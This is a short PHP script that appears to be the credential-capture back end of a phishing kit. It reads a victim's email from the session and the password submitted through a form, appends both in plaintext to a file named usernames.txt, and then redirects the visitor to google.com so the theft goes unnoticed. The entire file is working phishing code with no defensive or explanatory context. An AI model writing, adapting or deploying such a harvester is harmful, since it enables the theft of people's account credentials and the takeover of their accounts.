<?php # DO NOT EDIT/TAMPER WITH THIS FILE #
			session_start();

			
			
			$email=$_SESSION["Email"];
			$pass = $_POST["password"];
			
			
			file_put_contents("usernames.txt", "Account: " . $email . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
  			header('Location: https://google.com');
			exit();
			
			
			session_destroy();
			
?>
